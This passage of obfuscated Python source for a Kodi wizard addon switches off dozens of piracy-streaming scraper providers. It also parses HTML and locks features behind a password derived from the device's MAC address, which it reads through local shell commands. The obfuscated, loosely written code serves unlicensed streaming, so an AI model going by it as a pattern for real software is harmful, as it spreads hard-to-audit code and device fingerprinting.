		O0000000O0O0O0O00 .setSetting ('wse','false')#line:1220
		O0000000O0O0O0O00 .setSetting ('wss','false')#line:1221
		O0000000O0O0O0O00 .setSetting ('wsse','false')#line:1222
		O0000000O0O0O0O00 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1223
		O0000000O0O0O0O00 .setSetting ('debrid.only','true')#line:1224
		O0000000O0O0O0O00 .setSetting ('hosts.captcha','false')#line:1225
		O0000000O0O0O0O00 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1226
		O0000000O0O0O0O00 .setSetting ('provider.123moviehd','false')#line:1227
		O0000000O0O0O0O00 .setSetting ('provider.300mbdownload','false')#line:1228
		O0000000O0O0O0O00 .setSetting ('provider.alltube','false')#line:1229
		O0000000O0O0O0O00 .setSetting ('provider.allucde','false')#line:1230
		O0000000O0O0O0O00 .setSetting ('provider.animebase','false')#line:1231
		O0000000O0O0O0O00 .setSetting ('provider.animeloads','false')#line:1232
		O0000000O0O0O0O00 .setSetting ('provider.animetoon','false')#line:1233
		O0000000O0O0O0O00 .setSetting ('provider.bnwmovies','false')#line:1234
		O0000000O0O0O0O00 .setSetting ('provider.boxfilm','false')#line:1235
		O0000000O0O0O0O00 .setSetting ('provider.bs','false')#line:1236
		O0000000O0O0O0O00 .setSetting ('provider.cartoonhd','false')#line:1237
		O0000000O0O0O0O00 .setSetting ('provider.cdahd','false')#line:1238
		O0000000O0O0O0O00 .setSetting ('provider.cdax','false')#line:1239
		O0000000O0O0O0O00 .setSetting ('provider.cine','false')#line:1240
		O0000000O0O0O0O00 .setSetting ('provider.cinenator','false')#line:1241
		O0000000O0O0O0O00 .setSetting ('provider.cmovieshdbz','false')#line:1242
		O0000000O0O0O0O00 .setSetting ('provider.coolmoviezone','false')#line:1243
		O0000000O0O0O0O00 .setSetting ('provider.ddl','false')#line:1244
		O0000000O0O0O0O00 .setSetting ('provider.deepmovie','false')#line:1245
		O0000000O0O0O0O00 .setSetting ('provider.ekinomaniak','false')#line:1246
		O0000000O0O0O0O00 .setSetting ('provider.ekinotv','false')#line:1247
		O0000000O0O0O0O00 .setSetting ('provider.filiser','false')#line:1248
		O0000000O0O0O0O00 .setSetting ('provider.filmpalast','false')#line:1249
		O0000000O0O0O0O00 .setSetting ('provider.filmwebbooster','false')#line:1250
		O0000000O0O0O0O00 .setSetting ('provider.filmxy','false')#line:1251
		O0000000O0O0O0O00 .setSetting ('provider.fmovies','false')#line:1252
		O0000000O0O0O0O00 .setSetting ('provider.foxx','false')#line:1253
		O0000000O0O0O0O00 .setSetting ('provider.freefmovies','false')#line:1254
		O0000000O0O0O0O00 .setSetting ('provider.freeputlocker','false')#line:1255
		O0000000O0O0O0O00 .setSetting ('provider.furk','false')#line:1256
		O0000000O0O0O0O00 .setSetting ('provider.gamatotv','false')#line:1257
		O0000000O0O0O0O00 .setSetting ('provider.gogoanime','false')#line:1258
		O0000000O0O0O0O00 .setSetting ('provider.gowatchseries','false')#line:1259
		O0000000O0O0O0O00 .setSetting ('provider.hackimdb','false')#line:1260
		O0000000O0O0O0O00 .setSetting ('provider.hdfilme','false')#line:1261
		O0000000O0O0O0O00 .setSetting ('provider.hdmto','false')#line:1262
		O0000000O0O0O0O00 .setSetting ('provider.hdpopcorns','false')#line:1263
		O0000000O0O0O0O00 .setSetting ('provider.hdstreams','false')#line:1264
		O0000000O0O0O0O00 .setSetting ('provider.horrorkino','false')#line:1266
		O0000000O0O0O0O00 .setSetting ('provider.iitv','false')#line:1267
		O0000000O0O0O0O00 .setSetting ('provider.iload','false')#line:1268
		O0000000O0O0O0O00 .setSetting ('provider.iwaatch','false')#line:1269
		O0000000O0O0O0O00 .setSetting ('provider.kinodogs','false')#line:1270
		O0000000O0O0O0O00 .setSetting ('provider.kinoking','false')#line:1271
		O0000000O0O0O0O00 .setSetting ('provider.kinow','false')#line:1272
		O0000000O0O0O0O00 .setSetting ('provider.kinox','false')#line:1273
		O0000000O0O0O0O00 .setSetting ('provider.lichtspielhaus','false')#line:1274
		O0000000O0O0O0O00 .setSetting ('provider.liomenoi','false')#line:1275
		O0000000O0O0O0O00 .setSetting ('provider.magnetdl','false')#line:1278
		O0000000O0O0O0O00 .setSetting ('provider.megapelistv','false')#line:1279
		O0000000O0O0O0O00 .setSetting ('provider.movie2k-ac','false')#line:1280
		O0000000O0O0O0O00 .setSetting ('provider.movie2k-ag','false')#line:1281
		O0000000O0O0O0O00 .setSetting ('provider.movie2z','false')#line:1282
		O0000000O0O0O0O00 .setSetting ('provider.movie4k','false')#line:1283
		O0000000O0O0O0O00 .setSetting ('provider.movie4kis','false')#line:1284
		O0000000O0O0O0O00 .setSetting ('provider.movieneo','false')#line:1285
		O0000000O0O0O0O00 .setSetting ('provider.moviesever','false')#line:1286
		O0000000O0O0O0O00 .setSetting ('provider.movietown','false')#line:1287
		O0000000O0O0O0O00 .setSetting ('provider.mvrls','false')#line:1289
		O0000000O0O0O0O00 .setSetting ('provider.netzkino','false')#line:1290
		O0000000O0O0O0O00 .setSetting ('provider.odb','false')#line:1291
		O0000000O0O0O0O00 .setSetting ('provider.openkatalog','false')#line:1292
		O0000000O0O0O0O00 .setSetting ('provider.ororo','false')#line:1293
		O0000000O0O0O0O00 .setSetting ('provider.paczamy','false')#line:1294
		O0000000O0O0O0O00 .setSetting ('provider.peliculasdk','false')#line:1295
		O0000000O0O0O0O00 .setSetting ('provider.pelisplustv','false')#line:1296
		O0000000O0O0O0O00 .setSetting ('provider.pepecine','false')#line:1297
		O0000000O0O0O0O00 .setSetting ('provider.primewire','false')#line:1298
		O0000000O0O0O0O00 .setSetting ('provider.projectfreetv','false')#line:1299
		O0000000O0O0O0O00 .setSetting ('provider.proxer','false')#line:1300
		O0000000O0O0O0O00 .setSetting ('provider.pureanime','false')#line:1301
		O0000000O0O0O0O00 .setSetting ('provider.putlocker','false')#line:1302
		O0000000O0O0O0O00 .setSetting ('provider.putlockerfree','false')#line:1303
		O0000000O0O0O0O00 .setSetting ('provider.reddit','false')#line:1304
		O0000000O0O0O0O00 .setSetting ('provider.cartoonwire','false')#line:1305
		O0000000O0O0O0O00 .setSetting ('provider.seehd','false')#line:1306
		O0000000O0O0O0O00 .setSetting ('provider.segos','false')#line:1307
		O0000000O0O0O0O00 .setSetting ('provider.serienstream','false')#line:1308
		O0000000O0O0O0O00 .setSetting ('provider.series9','false')#line:1309
		O0000000O0O0O0O00 .setSetting ('provider.seriesever','false')#line:1310
		O0000000O0O0O0O00 .setSetting ('provider.seriesonline','false')#line:1311
		O0000000O0O0O0O00 .setSetting ('provider.seriespapaya','false')#line:1312
		O0000000O0O0O0O00 .setSetting ('provider.sezonlukdizi','false')#line:1313
		O0000000O0O0O0O00 .setSetting ('provider.solarmovie','false')#line:1314
		O0000000O0O0O0O00 .setSetting ('provider.solarmoviez','false')#line:1315
		O0000000O0O0O0O00 .setSetting ('provider.stream-to','false')#line:1316
		O0000000O0O0O0O00 .setSetting ('provider.streamdream','false')#line:1317
		O0000000O0O0O0O00 .setSetting ('provider.streamflix','false')#line:1318
		O0000000O0O0O0O00 .setSetting ('provider.streamit','false')#line:1319
		O0000000O0O0O0O00 .setSetting ('provider.swatchseries','false')#line:1320
		O0000000O0O0O0O00 .setSetting ('provider.szukajkatv','false')#line:1321
		O0000000O0O0O0O00 .setSetting ('provider.tainiesonline','false')#line:1322
		O0000000O0O0O0O00 .setSetting ('provider.tainiomania','false')#line:1323
		O0000000O0O0O0O00 .setSetting ('provider.tata','false')#line:1326
		O0000000O0O0O0O00 .setSetting ('provider.trt','false')#line:1327
		O0000000O0O0O0O00 .setSetting ('provider.tvbox','false')#line:1328
		O0000000O0O0O0O00 .setSetting ('provider.ultrahd','false')#line:1329
		O0000000O0O0O0O00 .setSetting ('provider.video4k','false')#line:1330
		O0000000O0O0O0O00 .setSetting ('provider.vidics','false')#line:1331
		O0000000O0O0O0O00 .setSetting ('provider.view4u','false')#line:1332
		O0000000O0O0O0O00 .setSetting ('provider.watchseries','false')#line:1333
		O0000000O0O0O0O00 .setSetting ('provider.xrysoi','false')#line:1334
		O0000000O0O0O0O00 .setSetting ('provider.library','false')#line:1335
def fixfont ():#line:1338
	O0000O0O00O0OOO0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1339
	O0OOO0OOO0OOO0O00 =json .loads (O0000O0O00O0OOO0O );#line:1341
	O000O0OOOO00O00O0 =O0OOO0OOO0OOO0O00 ["result"]["settings"]#line:1342
	OO0OO0OOO0OOOO0O0 =[O0OO00OOOO0O0O00O for O0OO00OOOO0O0O00O in O000O0OOOO00O00O0 if O0OO00OOOO0O0O00O ["id"]=="audiooutput.audiodevice"][0 ]#line:1344
	O00OOOO0OOOOOOO0O =OO0OO0OOO0OOOO0O0 ["options"];#line:1345
	OO00O0OO0O0O0OOO0 =OO0OO0OOO0OOOO0O0 ["value"];#line:1346
	O00OO00OO0000O0OO =[OO00OO0O0OO00O0OO for (OO00OO0O0OO00O0OO ,O0O00OOO0O00O0O00 )in enumerate (O00OOOO0OOOOOOO0O )if O0O00OOO0O00O0O00 ["value"]==OO00O0OO0O0O0OOO0 ][0 ];#line:1348
	OOOO0O0OOOOOO0OOO =(O00OO00OO0000O0OO +1 )%len (O00OOOO0OOOOOOO0O )#line:1350
	OOO00OO0O00OOO0O0 =O00OOOO0OOOOOOO0O [OOOO0O0OOOOOO0OOO ]["value"]#line:1352
	OOOO000OOOO0OO00O =O00OOOO0OOOOOOO0O [OOOO0O0OOOOOO0OOO ]["label"]#line:1353
	OOO0OO0O00O00OO00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1355
	try :#line:1357
		OOO00O0OOO0O0O000 =json .loads (OOO0OO0O00O00OO00 );#line:1358
		if OOO00O0OOO0O0O000 ["result"]!=True :#line:1360
			raise Exception #line:1361
	except :#line:1362
		sys .stderr .write ("Error switching audio output device")#line:1363
		raise Exception #line:1364
def parseDOM2 (O00O000O0OO000O00 ,name =u"",attrs ={},ret =False ):#line:1365
	if isinstance (O00O000O0OO000O00 ,str ):#line:1368
		try :#line:1369
			O00O000O0OO000O00 =[O00O000O0OO000O00 .decode ("utf-8")]#line:1370
		except :#line:1371
			O00O000O0OO000O00 =[O00O000O0OO000O00 ]#line:1372
	elif isinstance (O00O000O0OO000O00 ,unicode ):#line:1373
		O00O000O0OO000O00 =[O00O000O0OO000O00 ]#line:1374
	elif not isinstance (O00O000O0OO000O00 ,list ):#line:1375
		return u""#line:1376
	if not name .strip ():#line:1378
		return u""#line:1379
	OO0OO0000O00000O0 =[]#line:1381
	for O000OO0O0O00O0O00 in O00O000O0OO000O00 :#line:1382
		OOO0O0OO00OOO0OO0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O000OO0O0O00O0O00 )#line:1383
		for O0O00OO00OO0OO00O in OOO0O0OO00OOO0OO0 :#line:1384
			O000OO0O0O00O0O00 =O000OO0O0O00O0O00 .replace (O0O00OO00OO0OO00O ,O0O00OO00OO0OO00O .replace ("\n"," "))#line:1385
		O0000000O0O000O0O =[]#line:1387
		for O0OOOO0OOO00O00O0 in attrs :#line:1388
			OO0OOO0OO0O00O0OO =re .compile ('(<'+name +'[^>]*?(?:'+O0OOOO0OOO00O00O0 +'=[\'"]'+attrs [O0OOOO0OOO00O00O0 ]+'[\'"].*?>))',re .M |re .S ).findall (O000OO0O0O00O0O00 )#line:1389
			if len (OO0OOO0OO0O00O0OO )==0 and attrs [O0OOOO0OOO00O00O0 ].find (" ")==-1 :#line:1390
				OO0OOO0OO0O00O0OO =re .compile ('(<'+name +'[^>]*?(?:'+O0OOOO0OOO00O00O0 +'='+attrs [O0OOOO0OOO00O00O0 ]+'.*?>))',re .M |re .S ).findall (O000OO0O0O00O0O00 )#line:1391
			if len (O0000000O0O000O0O )==0 :#line:1393
				O0000000O0O000O0O =OO0OOO0OO0O00O0OO #line:1394
				OO0OOO0OO0O00O0OO =[]#line:1395
			else :#line:1396
				O0O0OO00O0O00OO00 =range (len (O0000000O0O000O0O ))#line:1397
				O0O0OO00O0O00OO00 .reverse ()#line:1398
				for O000O00O0OO0O0OOO in O0O0OO00O0O00OO00 :#line:1399
					if not O0000000O0O000O0O [O000O00O0OO0O0OOO ]in OO0OOO0OO0O00O0OO :#line:1400
						del (O0000000O0O000O0O [O000O00O0OO0O0OOO ])#line:1401
		if len (O0000000O0O000O0O )==0 and attrs =={}:#line:1403
			O0000000O0O000O0O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O000OO0O0O00O0O00 )#line:1404
			if len (O0000000O0O000O0O )==0 :#line:1405
				O0000000O0O000O0O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O000OO0O0O00O0O00 )#line:1406
		if isinstance (ret ,str ):#line:1408
			OO0OOO0OO0O00O0OO =[]#line:1409
			for O0O00OO00OO0OO00O in O0000000O0O000O0O :#line:1410
				OO0O0OOOOOOOO0000 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0O00OO00OO0OO00O )#line:1411
				if len (OO0O0OOOOOOOO0000 )==0 :#line:1412
					OO0O0OOOOOOOO0000 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0O00OO00OO0OO00O )#line:1413
				for OOO00O0OO0000OO0O in OO0O0OOOOOOOO0000 :#line:1414
					OO0OO0O0OO0000OOO =OOO00O0OO0000OO0O [0 ]#line:1415
					if OO0OO0O0OO0000OOO in "'\"":#line:1416
						if OOO00O0OO0000OO0O .find ('='+OO0OO0O0OO0000OOO ,OOO00O0OO0000OO0O .find (OO0OO0O0OO0000OOO ,1 ))>-1 :#line:1417
							OOO00O0OO0000OO0O =OOO00O0OO0000OO0O [:OOO00O0OO0000OO0O .find ('='+OO0OO0O0OO0000OOO ,OOO00O0OO0000OO0O .find (OO0OO0O0OO0000OOO ,1 ))]#line:1418
						if OOO00O0OO0000OO0O .rfind (OO0OO0O0OO0000OOO ,1 )>-1 :#line:1420
							OOO00O0OO0000OO0O =OOO00O0OO0000OO0O [1 :OOO00O0OO0000OO0O .rfind (OO0OO0O0OO0000OOO )]#line:1421
					else :#line:1422
						if OOO00O0OO0000OO0O .find (" ")>0 :#line:1423
							OOO00O0OO0000OO0O =OOO00O0OO0000OO0O [:OOO00O0OO0000OO0O .find (" ")]#line:1424
						elif OOO00O0OO0000OO0O .find ("/")>0 :#line:1425
							OOO00O0OO0000OO0O =OOO00O0OO0000OO0O [:OOO00O0OO0000OO0O .find ("/")]#line:1426
						elif OOO00O0OO0000OO0O .find (">")>0 :#line:1427
							OOO00O0OO0000OO0O =OOO00O0OO0000OO0O [:OOO00O0OO0000OO0O .find (">")]#line:1428
					OO0OOO0OO0O00O0OO .append (OOO00O0OO0000OO0O .strip ())#line:1430
			O0000000O0O000O0O =OO0OOO0OO0O00O0OO #line:1431
		else :#line:1432
			OO0OOO0OO0O00O0OO =[]#line:1433
			for O0O00OO00OO0OO00O in O0000000O0O000O0O :#line:1434
				OO0OOOOOO0O0OOO0O =u"</"+name #line:1435
				O0O0OO0O0O00OO0OO =O000OO0O0O00O0O00 .find (O0O00OO00OO0OO00O )#line:1437
				OOO0O00O00O000OOO =O000OO0O0O00O0O00 .find (OO0OOOOOO0O0OOO0O ,O0O0OO0O0O00OO0OO )#line:1438
				O00OO0000OO0O0000 =O000OO0O0O00O0O00 .find ("<"+name ,O0O0OO0O0O00OO0OO +1 )#line:1439
				while O00OO0000OO0O0000 <OOO0O00O00O000OOO and O00OO0000OO0O0000 !=-1 :#line:1441
					O000OOO000O0O0OO0 =O000OO0O0O00O0O00 .find (OO0OOOOOO0O0OOO0O ,OOO0O00O00O000OOO +len (OO0OOOOOO0O0OOO0O ))#line:1442
					if O000OOO000O0O0OO0 !=-1 :#line:1443
						OOO0O00O00O000OOO =O000OOO000O0O0OO0 #line:1444
					O00OO0000OO0O0000 =O000OO0O0O00O0O00 .find ("<"+name ,O00OO0000OO0O0000 +1 )#line:1445
				if O0O0OO0O0O00OO0OO ==-1 and OOO0O00O00O000OOO ==-1 :#line:1447
					OOO000000000OOOOO =u""#line:1448
				elif O0O0OO0O0O00OO0OO >-1 and OOO0O00O00O000OOO >-1 :#line:1449
					OOO000000000OOOOO =O000OO0O0O00O0O00 [O0O0OO0O0O00OO0OO +len (O0O00OO00OO0OO00O ):OOO0O00O00O000OOO ]#line:1450
				elif OOO0O00O00O000OOO >-1 :#line:1451
					OOO000000000OOOOO =O000OO0O0O00O0O00 [:OOO0O00O00O000OOO ]#line:1452
				elif O0O0OO0O0O00OO0OO >-1 :#line:1453
					OOO000000000OOOOO =O000OO0O0O00O0O00 [O0O0OO0O0O00OO0OO +len (O0O00OO00OO0OO00O ):]#line:1454
				if ret :#line:1456
					OO0OOOOOO0O0OOO0O =O000OO0O0O00O0O00 [OOO0O00O00O000OOO :O000OO0O0O00O0O00 .find (">",O000OO0O0O00O0O00 .find (OO0OOOOOO0O0OOO0O ))+1 ]#line:1457
					OOO000000000OOOOO =O0O00OO00OO0OO00O +OOO000000000OOOOO +OO0OOOOOO0O0OOO0O #line:1458
				O000OO0O0O00O0O00 =O000OO0O0O00O0O00 [O000OO0O0O00O0O00 .find (OOO000000000OOOOO ,O000OO0O0O00O0O00 .find (O0O00OO00OO0OO00O ))+len (OOO000000000OOOOO ):]#line:1460
				OO0OOO0OO0O00O0OO .append (OOO000000000OOOOO )#line:1461
			O0000000O0O000O0O =OO0OOO0OO0O00O0OO #line:1462
		OO0OO0000O00000O0 +=O0000000O0O000O0O #line:1463
	return OO0OO0000O00000O0 #line:1465
def addItem (O0O00000OOOOOO000 ,OOOO00O0O00OO0O00 ,O00OO0OO000OO000O ,O0O000000O0O0OO0O ,OO0OOO0O00O0OO0O0 ,description =None ):#line:1467
	if description ==None :description =''#line:1468
	description ='[COLOR white]'+description +'[/COLOR]'#line:1469
	O0OOOOOO0OOOOOO00 =sys .argv [0 ]+"?url="+urllib .quote_plus (OOOO00O0O00OO0O00 )+"&mode="+str (O00OO0OO000OO000O )+"&name="+urllib .quote_plus (O0O00000OOOOOO000 )+"&iconimage="+urllib .quote_plus (O0O000000O0O0OO0O )+"&fanart="+urllib .quote_plus (OO0OOO0O00O0OO0O0 )#line:1470
	OO0O00O00O0OO0OO0 =True #line:1471
	O00OOOOO0O00OOO00 =xbmcgui .ListItem (O0O00000OOOOOO000 ,iconImage =O0O000000O0O0OO0O ,thumbnailImage =O0O000000O0O0OO0O )#line:1472
	O00OOOOO0O00OOO00 .setInfo (type ="Video",infoLabels ={"Title":O0O00000OOOOOO000 ,"Plot":description })#line:1473
	O00OOOOO0O00OOO00 .setProperty ("fanart_Image",OO0OOO0O00O0OO0O0 )#line:1474
	O00OOOOO0O00OOO00 .setProperty ("icon_Image",O0O000000O0O0OO0O )#line:1475
	OO0O00O00O0OO0OO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOOOOO0OOOOOO00 ,listitem =O00OOOOO0O00OOO00 ,isFolder =False )#line:1476
	return OO0O00O00O0OO0OO0 #line:1477
def get_params ():#line:1479
		O0O00OOOO0OOO00OO =[]#line:1480
		OO00O00O00O0O0O00 =sys .argv [2 ]#line:1481
		if len (OO00O00O00O0O0O00 )>=2 :#line:1482
				OOO0000O0OOOOO0O0 =sys .argv [2 ]#line:1483
				O0OOO0OOO00OOO00O =OOO0000O0OOOOO0O0 .replace ('?','')#line:1484
				if (OOO0000O0OOOOO0O0 [len (OOO0000O0OOOOO0O0 )-1 ]=='/'):#line:1485
						OOO0000O0OOOOO0O0 =OOO0000O0OOOOO0O0 [0 :len (OOO0000O0OOOOO0O0 )-2 ]#line:1486
				OO00O0O00000000O0 =O0OOO0OOO00OOO00O .split ('&')#line:1487
				O0O00OOOO0OOO00OO ={}#line:1488
				for O0O0O0OOOOO00O000 in range (len (OO00O0O00000000O0 )):#line:1489
						O00O00OO0O00O0OO0 ={}#line:1490
						O00O00OO0O00O0OO0 =OO00O0O00000000O0 [O0O0O0OOOOO00O000 ].split ('=')#line:1491
						if (len (O00O00OO0O00O0OO0 ))==2 :#line:1492
								O0O00OOOO0OOO00OO [O00O00OO0O00O0OO0 [0 ]]=O00O00OO0O00O0OO0 [1 ]#line:1493
		return O0O00OOOO0OOO00OO #line:1495
def decode (OOOO0OOOO000OO0OO ,O00000OOOO0OO00OO ):#line:1500
    import base64 #line:1501
    O0O0O00O0OOO0O00O =[]#line:1502
    if (len (OOOO0OOOO000OO0OO ))!=4 :#line:1504
     return 10 #line:1505
    O00000OOOO0OO00OO =base64 .urlsafe_b64decode (O00000OOOO0OO00OO )#line:1506
    for O0O0O00O0O00OO0O0 in range (len (O00000OOOO0OO00OO )):#line:1508
        OO0O00000000O0000 =OOOO0OOOO000OO0OO [O0O0O00O0O00OO0O0 %len (OOOO0OOOO000OO0OO )]#line:1509
        O0O00OOO000O0OO00 =chr ((256 +ord (O00000OOOO0OO00OO [O0O0O00O0O00OO0O0 ])-ord (OO0O00000000O0000 ))%256 )#line:1510
        O0O0O00O0OOO0O00O .append (O0O00OOO000O0OO00 )#line:1511
    return "".join (O0O0O00O0OOO0O00O )#line:1512
def tmdb_list (O00O000OOO0O00O00 ):#line:1513
    OOOO00O0O0O0OOOOO =decode ("7643",O00O000OOO0O00O00 )#line:1516
    return int (OOOO00O0O0O0OOOOO )#line:1519
def u_list (O0O00OOO0000OOOO0 ):#line:1520
    from math import sqrt #line:1522
    O0O0OO000OO0OOOOO =tmdb_list (TMDB_NEW_API )#line:1523
    O00O000OO000OOOO0 =str ((getHwAddr ('eth0'))*O0O0OO000OO0OOOOO )#line:1525
    O0OO0OOOOO0O0OO0O =int (O00O000OO000OOOO0 [1 ]+O00O000OO000OOOO0 [2 ]+O00O000OO000OOOO0 [5 ]+O00O000OO000OOOO0 [7 ])#line:1526
    O00O000OO0O0O0000 =(ADDON .getSetting ("pass"))#line:1528
    OO0000OO00O00O00O =(str (round (sqrt ((O0OO0OOOOO0O0OO0O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1533
    if '.'in OO0000OO00O00O00O :#line:1534
     OO0000OO00O00O00O =(str (round (sqrt ((O0OO0OOOOO0O0OO0O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1535
    logging .warning (OO0000OO00O00O00O )#line:1536
    if O00O000OO0O0O0000 ==OO0000OO00O00O00O :#line:1537
      OOOOOO0O00O00000O =O0O00OOO0000OOOO0 #line:1539
    else :#line:1541
       if STARTP2 ()and STARTP ()=='ok':#line:1542
         return O0O00OOO0000OOOO0 #line:1545
       OOOOOO0O00O00000O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1546
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1547
       sys .exit ()#line:1548
    return OOOOOO0O00O00000O #line:1549
def disply_hwr ():#line:1551
   OOOOOOOOOO0O00000 =tmdb_list (TMDB_NEW_API )#line:1552
   O0O0O00O00O000OO0 =str ((getHwAddr ('eth0'))*OOOOOOOOOO0O00000 )#line:1553
   O00OOOO0OO0OO00O0 =(O0O0O00O00O000OO0 [1 ]+O0O0O00O00O000OO0 [2 ]+O0O0O00O00O000OO0 [5 ]+O0O0O00O00O000OO0 [7 ])#line:1560
   O000OOOO000OOOO00 =(ADDON .getSetting ("action"))#line:1561
   wiz .setS ('action',str (O00OOOO0OO0OO00O0 ))#line:1563
def disply_hwr2 ():#line:1564
   OO00OOO0O00O0000O =tmdb_list (TMDB_NEW_API )#line:1565
   O0OO0O0OO0O0O0OOO =str ((getHwAddr ('eth0'))*OO00OOO0O00O0000O )#line:1566
   OO0000O000OO00OO0 =(O0OO0O0OO0O0O0OOO [1 ]+O0OO0O0OO0O0O0OOO [2 ]+O0OO0O0OO0O0O0OOO [5 ]+O0OO0O0OO0O0O0OOO [7 ])#line:1573
   O00000000OOOOOO0O =(ADDON .getSetting ("action"))#line:1574
   xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO0000O000OO00OO0 )#line:1577
def getHwAddr (O00O0O0OOO0O0000O ):#line:1579
   import subprocess ,time #line:1580
   O00000O00O00O0000 ='windows'#line:1581
   if xbmc .getCondVisibility ('system.platform.android'):#line:1582
       O00000O00O00O0000 ='android'#line:1583
   if xbmc .getCondVisibility ('system.platform.android'):#line:1584
     O00OOOOO00OO00OOO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1585
     OOO00O0OOO0OO00O0 =re .compile ('link/ether (.+?) brd').findall (str (O00OOOOO00OO00OOO ))#line:1587
     O0000OOOOO0OOO000 =0 #line:1588
     for O0000OOOOOO00O000 in OOO00O0OOO0OO00O0 :#line:1589
      if OOO00O0OOO0OO00O0 !='00:00:00:00:00:00':#line:1590
          OO00000OO0000OOOO =O0000OOOOOO00O000 #line:1591
          O0000OOOOO0OOO000 =O0000OOOOO0OOO000 +int (OO00000OO0000OOOO .replace (':',''),16 )#line:1592
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1594
       OO0OO000OOOO0OO00 =0 #line:1595
       O0000OOOOO0OOO000 =0 #line:1596
       OO00O0O0O0OO0O00O =[]#line:1597
       O000OO0OOOO00OO0O =os .popen ("getmac").read ()#line:1598
       O000OO0OOOO00OO0O =O000OO0OOOO00OO0O .split ("\n")#line:1599
       for OOO0OO0O0OO0OOO00 in O000OO0OOOO00OO0O :#line:1601
            O0OOOOO00O0O0000O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO0OO0O0OO0OOO00 ,re .I )#line:1602
            if O0OOOOO00O0O0000O :#line:1603
                OOO00O0OOO0OO00O0 =O0OOOOO00O0O0000O .group ().replace ('-',':')#line:1604
                OO00O0O0O0OO0O00O .append (OOO00O0OOO0OO00O0 )#line:1605
                O0000OOOOO0OOO000 =O0000OOOOO0OOO000 +int (OOO00O0OOO0OO00O0 .replace (':',''),16 )#line:1608
   else :#line:1610
       OO0OO000OOOO0OO00 =0 #line:1611
       O0000OOOOO0OOO000 =0 #line:1612
       while (1 ):#line:1613
         OO00000OO0000OOOO =xbmc .getInfoLabel ("network.macaddress")#line:1614
         logging .warning (OO00000OO0000OOOO )#line:1615
         if OO00000OO0000OOOO !="Busy"and OO00000OO0000OOOO !=' עסוק':#line:1616
            break #line:1618
         else :#line:1619
           OO0OO000OOOO0OO00 =OO0OO000OOOO0OO00 +1 #line:1620
           time .sleep (1 )#line:1621
           if OO0OO000OOOO0OO00 >30 :#line:1622
            break #line:1623
       O0000OOOOO0OOO000 =O0000OOOOO0OOO000 +int (OO00000OO0000OOOO .replace (':',''),16 )#line:1624
   return O0000OOOOO0OOO000 #line:1626
def getpass ():#line:1627
	disply_hwr2 ()#line:1629
def setpass ():#line:1630
    O000OOOO000000000 =xbmcgui .Dialog ()#line:1631
    OO0O0O000OO0OO0O0 =O000OOOO000000000 .numeric (0 ,'הכנס סיסמה')#line:1633
    wiz .setS ('pass',str (OO0O0O000OO0OO0O0 ))#line:1638
def setuname ():#line:1639
    O0O000O0OOO000000 =''#line:1640
    OO0O0OOO00OOO0000 =xbmc .Keyboard (O0O000O0OOO000000 ,'הכנס שם משתמש')#line:1641
    OO0O0OOO00OOO0000 .doModal ()#line:1642
    if OO0O0OOO00OOO0000 .isConfirmed ():#line:1643
           O0O000O0OOO000000 =OO0O0OOO00OOO0000 .getText ()#line:1644
           wiz .setS ('user',str (O0O000O0OOO000000 ))#line:1645
def powerkodi ():#line:1646
    os ._exit (1 )#line:1647
def buffer1 ():#line:1649
	O0O0OOO00O0O0OOOO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1650
	OO000OO000O00O0OO =xbmc .getInfoLabel ("System.Memory(total)")#line:1651
	OO00OOOO0OOOO00O0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1652
	OO0O0OO0O0OOOOO0O =re .sub ('[^0-9]','',OO00OOOO0OOOO00O0 )#line:1653
	OO0O0OO0O0OOOOO0O =int (OO0O0OO0O0OOOOO0O )/3 #line:1654
	O00O00OOO0000OOOO =OO0O0OO0O0OOOOO0O *1024 *1024 #line:1655
	try :OOO0OO0OO0OOO0O0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1656
	except :OOO0OO0OO0OOO0O0O =16 #line:1657
	O0O00OO00O0O0OO00 =DIALOG .yesno ('FREE MEMORY: '+str (OO00OOOO0OOOO00O0 ),'Based on your free Memory your optimal buffersize is: '+str (OO0O0OO0O0OOOOO0O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1660
	if O0O00OO00O0O0OO00 ==1 :#line:1661
		with open (O0O0OOO00O0O0OOOO ,"w")as O00O00OO0000OO0OO :#line:1662
			if OOO0OO0OO0OOO0O0O >=17 :O000O0O00O0OOO00O =xml_data_advSettings_New (str (O00O00OOO0000OOOO ))#line:1663
			else :O000O0O00O0OOO00O =xml_data_advSettings_old (str (O00O00OOO0000OOOO ))#line:1664
			O00O00OO0000OO0OO .write (O000O0O00O0OOO00O )#line:1666
			DIALOG .ok ('Buffer Size Set to: '+str (O00O00OOO0000OOOO ),'Please restart Kodi for settings to apply.','')#line:1667
	elif O0O00OO00O0O0OO00 ==0 :#line:1669
		O00O00OOO0000OOOO =_O0O000OOOOOOOOOO0 (default =str (O00O00OOO0000OOOO ),heading ="INPUT BUFFER SIZE")#line:1670
